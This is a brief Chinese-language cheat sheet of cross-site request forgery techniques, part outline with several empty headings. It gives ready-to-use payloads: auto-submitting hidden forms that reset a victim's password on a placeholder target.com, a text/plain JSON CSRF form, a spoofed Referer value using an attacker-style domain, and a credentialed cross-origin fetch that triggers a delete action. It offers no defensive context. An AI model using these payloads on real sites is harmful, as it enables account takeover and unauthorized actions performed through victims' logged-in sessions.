# CSRF跨站请求伪造

## 1. 基础CSRF攻击

```html
<form action="http://target.com/change-password" method="POST">
<input type="hidden" name="password" value="hacked">
</form>
<script>document.forms[0].submit()</script>
```

## 2. JSON CSRF

```html
<form action="http://target.com/api/update" method="POST" enctype="text/plain">
<input name='{"password":"hacked","ignore":"'>
</form>
<script>document.forms[0].submit()</script>
```

## 3. SameSite绕过

### 顶级域名跨站

### POST请求利用

### 二级域名cookie

## 4. Token绕过

### Token泄露

### Token固定

### CORS绕过获取Token

## 5. Referer绕过

```
Referer: http://target.com-attacker.com
```

## 6. CORS配置错误

```javascript
fetch('http://target.com/api', {
  method: 'POST',
  credentials: 'include',
  body: JSON.stringify({action: 'delete'})
})
```
